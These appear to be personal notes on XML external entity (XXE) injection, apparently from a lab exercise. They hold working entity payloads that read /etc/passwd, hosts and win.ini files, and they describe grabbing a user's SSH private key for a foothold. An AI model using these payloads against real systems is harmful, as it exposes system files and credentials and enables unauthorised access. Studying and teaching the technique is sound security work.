# XXE/XEE - XML eXternal Entity
﷽
* XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data.
## detection and usage
* if there are user input fields on the site, an XXE vuln may be present.
* intercept a packet using burp, and look for any mention of XML: such as
  * `<?xml version = "1.0"?>`
* Let's try to read `/etc/passwd` in different ways. 
* For Windows you could try to read `C:\windows\system32\drivers\etc\hosts`.
  * In this first case notice that SYSTEM "file:///etc/passwd" will also work.
    * `<!--?xml version="1.0" ?-->`
    * `<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>`
    * `<data>&example;</data>`
* if using a windows host, verify XXE validity by requesting the `c:/windows/win.ini` file.
* our request becomes something like this (remember to use burp):
```
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]>
<order>
<quantity>
3
</quantity>
<item>
&test;
</item>
<address>
17th Estate, CA
</address>
</order>
```
* notice the `<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]>` line, and 
* how we change one of the input fields to `&test;`.
* if, God willing, output of the `win.ini` file is provided then XEE should be there :)
#### foothold
* in my case i discovered a username on the `index.html`, which indicates that I could try grab a SSH key from the user to gain RCE 😏
  * the SSH private key is stored in `file:///c:/users/daniel/.ssh/id_rsa`, where
  * `daniel` is the username of the victim.
  * head over to `ssh.md` for basic pointers :)

